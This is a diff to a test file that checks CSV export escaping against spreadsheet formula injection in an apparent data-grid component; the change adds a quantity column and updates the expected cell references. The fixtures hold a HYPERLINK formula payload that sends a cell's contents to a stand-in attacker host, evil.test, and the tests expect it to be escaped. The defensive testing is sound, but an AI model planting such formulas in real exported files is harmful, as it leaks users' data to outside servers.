@@ -230,10 +230,16 @@ describe('formula injection on copy and export', () => {
       const grid = await mount(data);
       grid.setFormula(data[0], 'total', '=C1*2');
       const lines = grid
-        .exportToCSV({ filename: '', bom: false, formulas: true, columns: ['name', 'total'] })
+        .exportToCSV({
+          filename: '',
+          bom: false,
+          formulas: true,
+          columns: ['name', 'qty', 'total'],
+        })
         .split('\r\n');
-      expect(lines[1]).to.equal(`"'=HYPERLINK(""https://evil.test/?""&A2,""x"")",=C1*2`);
-      expect(lines[2]).to.equal("'-note,0");
+      // References point at the file's cells: qty (C1) is column B, row 2.
+      expect(lines[1]).to.equal(`"'=HYPERLINK(""https://evil.test/?""&A2,""x"")",2,=B2*2`);
+      expect(lines[2]).to.equal("'-note,3,0");
     });
 
     it('escapes header labels too', async () => {
@@ -243,10 +249,15 @@ describe('formula injection on copy and export', () => {
       await grid.updateComplete;
       grid.setFormula(data[0], 'total', '=C1*2');
       const lines = grid
-        .exportToCSV({ filename: '', bom: false, formulas: true, columns: ['name', 'total'] })
+        .exportToCSV({
+          filename: '',
+          bom: false,
+          formulas: true,
+          columns: ['name', 'qty', 'total'],
+        })
         .split('\r\n');
-      expect(lines[0]).to.equal("'=HDR(),total");
-      expect(lines[1]).to.match(/,=C1\*2$/);
+      expect(lines[0]).to.equal("'=HDR(),qty,total");
+      expect(lines[1]).to.match(/,=B2\*2$/);
     });
 
     it('writes all text raw with escapeFormulas: false', async () => {
@@ -258,9 +269,9 @@ describe('formula injection on copy and export', () => {
         bom: false,
         formulas: true,
         escapeFormulas: false,
-        columns: ['name', 'total'],
+        columns: ['name', 'qty', 'total'],
       });
-      expect(csv.split('\r\n')[2]).to.equal('-note,0');
+      expect(csv.split('\r\n')[2]).to.equal('-note,3,0');
     });
 
     it('escapes text cells in the plain export', async () => {
